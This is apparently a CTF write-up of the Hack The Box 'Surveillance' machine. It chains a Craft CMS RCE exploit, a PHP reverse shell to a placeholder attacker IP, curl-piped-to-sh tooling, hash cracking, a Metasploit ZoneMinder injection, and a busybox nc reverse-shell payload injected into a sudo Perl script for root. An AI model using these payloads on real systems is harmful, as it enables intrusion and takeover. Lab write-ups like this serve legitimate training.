# Initial Enumeration
I started of with a full Nmap scan using NmapAutomator.

```bash
./nmapAutomator.sh -H <TARGET_IP> -t All
```

## Ports and Services
|  Service  |  Port  |  Version  |
|-----------|--------|-----------|
|  SSH  | 22/tcp  |  OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) |
|  HTTP  | 80/tcp  |  nginx 1.18.0 (Ubuntu)  |

A web app with the domain `surveillance.htb` was discovered running on port 80.

# Web App Enumeration
The website on `http://surveillance.htb` is of a home security company.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/c7b548fc-59ca-471c-a0af-d39e5a7dd24a)
 Once looking into the source code of the website, we discovered it was created using Craft CMS v4.4.14.

 # Foothold
 A quick Google search for Craft CMS v4.4.14 exploits, revealed [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892), a vulnerability that allows Remote Code Execution. A [PoC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) for this vulonerability was found, however we need to run Burpsuite on our machine and make some adjustments for it to work on our target - changing the return statement in `getTmpUploadDirAndDocumentRoot()`:

```python
if "no value" in match1.group(1):
        return "no value", match2.group(1)
    else:
        return match1.group(1), match2.group(1)
```

Now that we have a working exploit, we can execute it and get RCE on the target as `www-data`:

```bash
┌─[✗]─[dana404@parrot]─[~/Documents/tmp/surveillance]
└──╼ $python3 exploit.py http://surveillance.htb
[-] Get temporary folder and document root ...
HTTP Request:
Method: POST
URL: http://surveillance.htb/
Headers: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36', 'Content-Length': '310', 'Content-Type': 'application/x-www-form-urlencoded'}
Body: action=conditions%2Frender&configObject%5Bclass%5D=craft%5Celements%5Cconditions%5CElementCondition&config=%7B%22name%22%3A%22configObject%22%2C%22as+%22%3A%7B%22class%22%3A%22%5C%5CGuzzleHttp%5C%5CPsr7%5C%5CFnStream%22%2C+%22__construct%28%29%22%3A%7B%22methods%22%3A%7B%22close%22%3A%22phpinfo%22%7D%7D%7D%7D
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Next, we will get a reverse shell by starting a Netcat Listener on our machine (`nc -lvnp 4444`), and executing the following command on the target:

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

Once we got the reverse shell, we will run the following command in order to upgrade our shell to a fully functional one:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

# Enumerating the Target Machine and Getting the User Flag
Because we have a fully functional shell, we can use linpeas to enumerate the machine. To so we will:
1. Download [linpeas.sh](https://linpeas.sh/) to our attack machine.
2. Start a python webserver on our attack machine: `sudo python3 -m http.server 80`.
3. From the target machine: access the linpeas file on our machine and run the script: `curl <ATTACK_IP>:80/linpeas.sh | sh`.

Linpeas found an interesting SQL backup file at `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql` in which we found a password hash for the user `matthew`!

```sql
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','<PASSWORD_HASH>','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

We chose to use [CrackStation](https://crackstation.net/) to quickly crack the hash. Now that we have a username and password we can connect to the target using SSH, and find in matthew's home directory the user flag!

```bash
┌─[dana404@parrot]─[~/Documents/Labs/Surveillance]
└──╼ $ssh matthew@10.10.11.245
matthew@10.10.11.245's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 16 01:51:35 PM UTC 2023

  System load:  0.04052734375     Processes:             235
  Usage of /:   84.6% of 5.91GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Dec 16 10:36:33 2023 from 10.10.14.9
matthew@surveillance:~$
```

# Lateral Movement
Other than `root` and `matthew`, we have another user with console - `zoneminder`:

```bash
matthew@surveillance:~$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
```

Additionally, we have an open 8080/tcp port which was not discoverable from the outside:

```bash
matthew@surveillance:~$ (netstat -punta || ss --ntpu) | grep "127.0"
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:52396         127.0.0.53:53           ESTABLISHED -
```

Lets use Port Forwarding to forward the service running on port 8080 on our target to our attack machine, so we can view it in our browser:

```bash
ssh -L 3000:127.0.0.1:8080 matthew@10.10.11.245
```

We found a login page for the ZoneMinder service. According to it's [GitHub page](https://github.com/ZoneMinder/zoneminder#:~:text=ZoneMinder%20is%20an%20integrated%20set,to%20a%20Linux%20based%20machine.):
> ZoneMinder is an integrated set of applications which provide a complete surveillance solution allowing capture, analysis, recording and monitoring of any CCTV or security cameras attached to a Linux based machine.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/d4d3f888-68ac-4d71-9ac9-b1e89a68b78a)

Some research online revealed the [ZoneMinder Snapshots Command Injection](https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/) module on MSFConsole, with which we got a shell as `zoneminder`! 

```bash
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set TARGET 1
TARGET => 1
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set RPORT 3000
RPORT => 3000
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set TARGETURI /
TARGETURI => /
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> run

[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Elapsed time: 10.802940403999855 seconds.
[+] The target is vulnerable.
[*] Fetching CSRF Token
[+] Got Token: key:106867928f1efa9fee609babfacd64d9bf03f6fc,1702639348
[*] Executing Linux (Dropper) for linux/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3045348 bytes) to 10.10.11.245
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.11.245:52886) at 2023-12-15 13:22:40 +0200
[+] Payload sent
[*] Command Stager progress - 100.00% done (823/823 bytes)

(Meterpreter 1)(/usr/share/zoneminder/www) > shell
Process 1686 created.
Channel 1 created.
id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

# Privilege Escalation
After upgrading the shell using `python3 -c "import pty; pty.spawn('/bin/bash')"` and running `sudo -l` we found that this user can run all the Perl files that begin with "zm" in the `/usr/bin` directory.

```bash
zoneminder@surveillance:/usr/bin$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

Looking further into the ZoneMinder repository, we gound the [source code](https://github.com/ZoneMinder/zoneminder/tree/master/scripts) for these files. We found `zmupdate.pl`, which takes unfiltered user input, uses it to create a system command, and executes it.

```perl
...SNIP...
$Config{ZM_DB_USER} = $dbUser;
$Config{ZM_DB_PASS} = $dbPass;
...SNIP...
 if ( $response =~ /^[yY]$/ ) {
      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
      my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
      if ( defined($portOrSocket) ) {
        if ( $portOrSocket =~ /^\// ) {
          $command .= ' -S'.$portOrSocket;
        } else {
          $command .= ' -h'.$host.' -P'.$portOrSocket;
        }
      } else {
        $command .= ' -h'.$host; 
      }
      my $backup = '@ZM_TMPDIR@/'.$Config{ZM_DB_NAME}.'-'.$version.'.dump';
      $command .= ' --add-drop-table --databases '.$Config{ZM_DB_NAME}.' > '.$backup;
      print("Creating backup to $backup. This may take several minutes.\n");
      ($command) = $command =~ /(.*)/; # detaint
...SNIP...
```

We can inject a command into the username, which will get execute once the final command is run on the target. Interestingly, there was an attempt to "detaint" the command, however the way it is done has no affect on the command.

```bash
sudo zmupdate.pl -u "<PAYLOAD>" -p password
```

We can use the following payload to get a reverse shell as root:

```
;busybox nc <ATTACKER_IP> <LISTENING_PORT> -e sh;
```

And finally we got a root shell!

```bash
┌─[✗]─[dana404@parrot]─[~]
└──╼ $nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.245] 35926
id
uid=0(root) gid=0(root) groups=0(root)
```
